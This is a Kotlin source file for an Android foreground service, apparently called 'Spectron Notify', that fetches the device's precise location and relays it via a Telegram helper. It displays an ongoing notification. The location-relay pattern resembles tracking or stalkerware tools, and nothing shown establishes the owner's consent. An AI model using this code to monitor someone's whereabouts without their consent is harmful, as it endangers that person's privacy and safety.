package com.spectron.notify

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.IBinder
import androidx.core.app.NotificationCompat
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority

class LocationService : Service() {
    private val client by lazy { LocationServices.getFusedLocationProviderClient(this) }

    override fun onCreate() {
        super.onCreate()
        val manager = getSystemService(NotificationManager::class.java)
        manager.createNotificationChannel(
            NotificationChannel(
                "spectron_location",
                "Spectron location",
                NotificationManager.IMPORTANCE_LOW
            )
        )

        val notification: Notification = NotificationCompat.Builder(this, "spectron_location")
            .setContentTitle("Spectron Notify")
            .setContentText("Location request is active")
            .setSmallIcon(android.R.drawable.ic_menu_mylocation)
            .setOngoing(true)
            .build()

        startForeground(1001, notification)
    }

    fun requestLocation() {
        client.getCurrentLocation(Priority.PRIORITY_HIGH_ACCURACY, null)
            .addOnSuccessListener { location ->
                if (location == null) {
                    Telegram.send(this, "SPECTRON NOTIFY\n\nLocation unavailable.")
                } else {
                    val maps = "https://maps.google.com/?q=${location.latitude},${location.longitude}"
                    Telegram.send(
                        this,
                        "SPECTRON NOTIFY\n\n" +
                            "Current location\n" +
                            "Latitude: ${location.latitude}\n" +
                            "Longitude: ${location.longitude}\n" +
                            "Accuracy: ${location.accuracy} m\n" +
                            "Map: $maps"
                    )
                }
                stopSelf()
            }
            .addOnFailureListener {
                Telegram.send(this, "SPECTRON NOTIFY\n\nLocation request failed: ${it.message ?: "Unknown error"}")
                stopSelf()
            }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        requestLocation()
        return START_NOT_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
